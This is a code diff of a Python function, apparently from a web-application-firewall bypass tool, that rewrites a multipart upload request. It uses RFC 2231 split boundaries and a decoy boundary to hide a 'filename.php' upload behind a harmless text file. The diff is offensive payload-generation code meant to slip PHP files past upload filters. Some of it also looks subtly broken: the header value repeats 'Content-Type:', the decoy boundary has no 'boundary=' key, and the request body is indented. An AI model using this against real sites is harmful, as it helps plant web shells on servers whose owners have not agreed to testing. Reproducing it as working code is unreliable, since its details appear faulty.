@@ -257,32 +257,37 @@ def mutant_methods_for_test_use(headers, url, method, data, files):
 
 
 def mutant_methods_multipart_boundary(headers, url, method, data, files):
-    """ 对 boundary 进行变异进而绕过"""
+    """ 对 boundary 进行变异进而绕过 适用于 upload 方法"""
     logger.info(TAG + "==>mutant_methods_multipart_boundary")
     logger.debug(TAG + "==>headers: " + str(headers))
-
+    if files is None:
+        return []
     mutant_payloads = []
-    if 'Content-Type' not in headers or 'boundary' not in headers['Content-Type']:
-        return mutant_payloads
     # 基于 RFC 2231 的boundary构造
-    boundary1 = ';boundary*0="-real-"'
-    boundary2 = ';boundary*1="boundary"'
-    headers['Content-Type'] = headers['Content-Type']+boundary1+boundary2
+    boundary0 = '----fakeBoundary'
+    boundary1 = ';boundary*0="----real"'
+    boundary2 = ';boundary*1="Boundary"'
+    headers['Content-Type'] = 'Content-Type: multipart/form-data;'+boundary0+boundary1+boundary2
 
-    old_boundary = headers['Content-Type'].split('boundary')[1]
-    # 第一种是go的解析方式，第二种是flask的解析方式
-    new_boundaries = ["-real-boundary", old_boundary+"-real-boundary"]
-    for new_boundary in new_boundaries:
-        fake_data = data.replace(old_boundary, new_boundary)
-        data += fake_data
-        logger.debug(TAG + "==>data: " + data)
-        mutant_payloads.append({
-            'headers': headers,
-            'url': url,
-            'method': method,
-            'data': data,
-            'files': files
-        })
+    # 构造带有自定义boundary的请求体
+    multipart_data = '''
+    ------fakeBoundary
+    Content-Disposition: form-data; name="file"; filename="filename.txt"
+    Content-Type: text/plain
+    ------fakeBoundary--
+    ------realBoundary
+    Content-Disposition: form-data; name="file"; filename="filename.php"
+    Content-Type: text/plain
+    ------realBoundary--
+    '''
+    logger.debug(TAG + "==>data: " + multipart_data)
+    mutant_payloads.append({
+        'headers': headers,
+        'url': url,
+        'method': method,
+        'data': multipart_data,
+        'files': files
+    })
     return mutant_payloads
 
 
